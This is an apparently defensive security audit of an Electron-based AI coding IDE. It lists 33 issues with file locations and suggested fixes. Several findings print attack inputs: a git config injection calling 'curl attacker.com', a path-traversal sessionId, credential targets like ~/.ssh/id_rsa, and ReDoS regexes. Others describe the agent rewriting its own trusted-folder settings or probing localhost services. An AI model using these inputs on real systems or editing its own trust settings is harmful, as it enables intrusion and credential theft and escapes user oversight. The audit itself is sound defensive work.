# Artemis IDE - Production Readiness Issues

**Total Issues: 33**
- Critical Security: 13
- High Correctness/Logic: 9
- Medium Performance/Resource/Quality: 11

---

## CRITICAL — Security Vulnerabilities

### 1. `store:set` allows renderer to overwrite `trustedFolders` → privilege escalation
**File:** `electron/main.ts:276-287`

`store:set` accepts **any** key. The renderer can call `window.artemis.store.set('trustedFolders', ['/'])` to inject trusted folders, which are loaded from the store on next app restart (line 126-128). Trusted folders enable terminal + command execution. Only `apiKey:*` keys are protected.

**Fix:** Blocklist reserved keys (`trustedFolders`, `discordRpcEnabled`, `inlineCompletionConfig`, etc.) from being set by the renderer, or use a whitelist of allowed keys.

---

### 2. `checkpoint:restore` writes to arbitrary paths — no containment
**File:** `electron/services/checkpointService.ts:105-143`

`restoreCheckpoint` reads `fileMeta.path` from disk and writes directly to those paths. No `validateFsPath` or `enforceProjectContainment` check. Tampered checkpoint metadata → arbitrary file write anywhere on disk.

---

### 3. `checkpoint:create/restore` sessionId path traversal
**File:** `electron/services/checkpointService.ts:25-31`

`sessionId` comes from the renderer and is used directly in `path.join(checkpointsDir, sessionId)`. A `sessionId` like `../../../Windows/System32` traverses out of the checkpoints directory. Same applies to `checkpointId`.

**Fix:** Validate that sessionId/checkpointId match `/^[a-zA-Z0-9_-]+$/`.

---

### 4. `checkpoint:create` `filesToTrack` paths not contained
**File:** `electron/main.ts:836-838`

`filesToTrack` from renderer is passed directly to `createCheckpoint`, which reads those files (line 55). No containment check — renderer can snapshot any file on disk (e.g., `/etc/shadow`, `~/.ssh/id_rsa`).

---

### 5. `git:run` args not sanitized — config injection
**File:** `electron/main.ts:579-610`

Args are passed directly to `git`. `git -c core.sshCommand="curl attacker.com" clone ...` executes arbitrary commands. Need to block `-c`, `--config`, `--upload-pack`, `--receive-pack`, `--exec-path` flags.

---

### 6. `tools:searchFiles` doesn't enforce project containment
**File:** `electron/main.ts:612-690`

`dirPath` is used directly with no `validateFsPath` or `enforceProjectContainment`. The renderer can search any directory on the filesystem.

---

### 7. `linter:lint` doesn't enforce project containment
**File:** `electron/main.ts:912-914`

`filePath` and `projectPath` from renderer are passed directly to `lintFile` with no `validateFsPath` or `enforceProjectContainment`. Linter could be pointed at arbitrary files outside the project.

---

### 8. `shell:openPath` doesn't enforce project containment
**File:** `electron/main.ts:458-469`

Validates the path format but does NOT enforce it's within the project or trusted folder. Can open any directory on the filesystem in the OS file manager.

---

### 9. Agent can read/write app settings file via ToolExecutor
**File:** `electron/shared/security.ts` (`enforceProjectContainment`)

`enforceProjectContainment` has an explicit exception for the `userData` directory. This means agent tools (`read_file`, `write_file`) can access `artemis-settings.json`, which contains `trustedFolders`. The agent could modify its own trust settings.

**Fix:** Block access to the store file specifically, or narrow the userData exception.

---

### 10. SSRF TOCTOU in `fetchUrl` — DNS rebinding
**File:** `electron/services/urlFetchService.ts:104-135`

DNS is resolved and validated, then `fetch()` re-resolves DNS independently. Attacker with DNS control can return a public IP at check time and a private IP at fetch time.

**Fix:** Resolve DNS, validate the IP, then connect directly to the resolved IP (set `Host` header manually).

---

### 11. `isAllowedApiUrl` allows all localhost ports
**File:** `electron/shared/security.ts`

`localhost` is in `ALLOWED_API_DOMAINS`. The agent's HTTP functions (`agent:httpRequest`, `agent:httpStream`) can reach **any** service on localhost, not just Ollama. A malicious model response could probe internal services.

**Fix:** Restrict localhost to port 11434 only, or add a port allowlist.

---

### 12. MCP custom server command not restricted to `ALLOWED_EXECUTABLES`
**File:** `electron/services/mcpClient.ts:81-151`

`MCPClient.connect` validates for dangerous shell chars but does NOT check against `ALLOWED_EXECUTABLES`. Any executable can be spawned as an MCP server. A user (or compromised renderer) can run arbitrary binaries.

---

### 13. ReDoS in `tools:searchFiles` user-supplied regex
**File:** `electron/main.ts:663-680`

The `dangerousPatterns` heuristic misses many ReDoS vectors (e.g., `(a+)+$`, `(a|a)*$`). User-supplied regex is compiled and tested against every line of every file. A catastrophic backtracking pattern freezes the main process.

**Fix:** Execute regex in a worker thread with a timeout, or use the `safe-regex2` library to validate before compilation.

---

## HIGH — Correctness / Logic Bugs

### 14. Trust model case normalization bug
**File:** `electron/main.ts:130-161`

`grantTrust` stores the original case (line 141). `isFolderTrusted` compares with `.toLowerCase()` (line 131). The Set accumulates multiple entries for the same folder with different casings. `revokeTrust` calls `trustedFolders.delete(resolved)` which may not match the stored casing.

**Fix:** Normalize to lowercase consistently in `grantTrust`, `revokeTrust`, and the Set itself.

---

### 15. `revokeTrust` unconditionally disables capabilities
**File:** `electron/main.ts:159-160`

When revoking trust for one folder, `capabilities.terminal = false` and `capabilities.commands = false` are set unconditionally, even if **other** folders are still trusted. If you have 2 trusted folders, revoking one kills terminal access for the other.

**Fix:** After revoking, re-check if the current `activeProjectPath` is still in a trusted folder.

---

### 16. `dialog:openFolder` sets `activeProjectPath` without trust check
**File:** `electron/main.ts:339-350`

Sets `activeProjectPath = path.resolve(folderPath)` directly, bypassing the trust check that `project:setPath` (line 324-337) performs. This means capabilities may not be correctly set.

---

### 17. `tools:searchFiles` regex error silently lost
**File:** `electron/main.ts:664-668`

Inside nested `searchDir`, `return { error: ... }` returns from `searchDir`, NOT from the outer IPC handler. The regex error is swallowed, and the handler returns whatever partial results were found. The caller never sees the error.

**Fix:** Compile and validate the regex **before** calling `searchDir`.

---

### 18. `pendingApprovals` leak on abandoned agent runs
**File:** `electron/api/ipc/AgentIPC.ts`

If the renderer crashes or navigates away, `pendingApprovals` entries persist with their 2-minute timers. The `AgentLoop.run()` is blocked, `activeRuns` is never cleaned up. Over time this leaks memory.

**Fix:** When `activeRuns.delete(requestId)` in the `finally` block, also reject and clean up all pending approvals for that request.

---

### 19. `agent:abort` doesn't cancel pending tool approvals
**File:** `electron/api/ipc/AgentIPC.ts`

When the user aborts, the abort flag is set, but any tool approval promise waiting in `pendingApprovals` keeps blocking. The abort should also reject all pending approvals for that requestId.

---

### 20. `session:create` accepts ID from renderer — hijackable
**File:** `electron/main.ts:692`

The terminal session ID is controlled by the renderer. A renderer could reuse an existing ID to overwrite/hijack that terminal session's PTY process.

**Fix:** Generate the ID server-side or validate it's not already in use.

---

### 21. `safeStorage` used before `app.whenReady()`
**File:** `electron/main.ts:833`

`mcpService.initMCPService(STORE_DIR)` at module level calls `loadInstalledServers()` → `decryptConfig()` → `safeStorage.decryptString()`. Electron docs state safeStorage may not be available before `app.whenReady()`. This can silently fail to decrypt MCP config values.

**Fix:** Move `initMCPService` inside `app.whenReady()`.

---

### 22. ConversationManager trimming creates dangling tool_call references
**File:** `electron/api/conversation/ConversationManager.ts`

When trimming old messages, tool_result messages can be removed while the corresponding tool_call remains (or vice versa). This creates orphaned references that confuse the model, causing errors or incorrect responses.

**Fix:** When trimming, always remove tool_call and tool_result as a pair.

---

## MEDIUM — Performance & Resource Leaks

### 23. Discord RPC `tryConnect` interval leak
**File:** `electron/services/discordRPCService.ts:269-275`

The `checkReady` setInterval (50ms) is started on connect. If the socket errors before `readyTimeout`, `resolve(false)` is called but `checkReady` interval is **never cleared**. It continues running until the 5-second timeout fires.

**Fix:** Clear `checkReady` in all resolve paths.

---

### 24. `zen:request` has no timeout
**File:** `electron/main.ts:786-831`

The `fetch()` call has no AbortController/timeout. A slow or hanging API server blocks the IPC handler indefinitely.

**Fix:** Add AbortController with a 30-60 second timeout.

---

### 25. No limit on concurrent agent runs
**File:** `electron/api/ipc/AgentIPC.ts`

`activeRuns` has no size limit. Multiple concurrent agent runs each hold a streaming HTTP connection + tool executions. 5+ parallel runs could exhaust file descriptors or cause API rate limit issues.

**Fix:** Cap at 3-5 concurrent runs.

---

### 26. No limit on concurrent MCP server connections
**File:** `electron/services/mcpService.ts`

No cap on simultaneously connected MCP servers. Each is a child process with stdin/stdout pipes.

**Fix:** Cap at 10-15 concurrent MCP servers.

---

### 27. Sync `fs.existsSync` in `resolveCommand` blocks main thread
**File:** `electron/services/mcpClient.ts:165-182`, `electron/services/linterService.ts:7-21`

Iterates all PATH directories with synchronous `fs.existsSync` for every command spawn. Blocks the event loop.

**Fix:** Use async `fs.promises.access` or cache the resolution.

---

### 28. Sequential file I/O in search (both `main.ts` and `ToolExecutor.ts`)
**File:** `electron/main.ts:639-690`, `electron/api/tools/ToolExecutor.ts`

Every file is stat'd then read sequentially. No parallelism. On large projects this is very slow.

**Fix:** Use `Promise.all` with a concurrency limiter (e.g., batches of 10-15).

---

### 29. `fs:writeFile` is not atomic — crash = corruption
**File:** `electron/main.ts:391-399`

Uses `fs.promises.writeFile` directly. A crash mid-write corrupts the file. The store already uses the correct tmp+rename pattern (line 99-102).

**Fix:** Use the same tmp+rename pattern for user file writes.

---

### 30. MCP client doesn't remove EventEmitter listeners on disconnect
**File:** `electron/services/mcpClient.ts:236-250`

`disconnect` kills the process but doesn't call `removeAllListeners()`. Repeated connect/disconnect cycles can leak listeners.

---

### 31. Store bloat — deleted sessions leave `messages-{id}: null`
**File:** `src/hooks/useSessionManager.ts:134`

`deleteSession` sets `messages-{id}` to `null` rather than removing the key. Over time, the store JSON grows with hundreds of null entries.

**Fix:** Use `delete store[key]` on the main process side, or add a `store:delete` IPC method.

---

### 32. `tsconfig.node.json` missing `strict: true`
**File:** `tsconfig.node.json`

The renderer tsconfig has `strict: true`, but the electron tsconfig (`tsconfig.node.json`) does NOT. All electron code compiles without strict null checks, allowing many null/undefined bugs.

---

### 33. Code duplication — `resolveCommand` exists in 3 places
**Files:** `electron/services/mcpClient.ts:165-182`, `electron/services/linterService.ts:7-21`, similar in `electron/api/tools/ToolExecutor.ts`

Same logic copy-pasted. Also `DANGEROUS_SHELL_CHARS` regex duplicated in `linterService.ts:5` vs `shared/security.ts`.

**Fix:** Consolidate into `shared/security.ts` or a shared utility.

---

## Summary

| Category | Count |
|-----------|-------|
| Critical Security | 13 |
| High Correctness/Logic | 9 |
| Medium Performance/Resource/Quality | 11 |
| **Total** | **33** |

**Production Readiness:** NOT READY. All 33 issues must be addressed before production deployment.
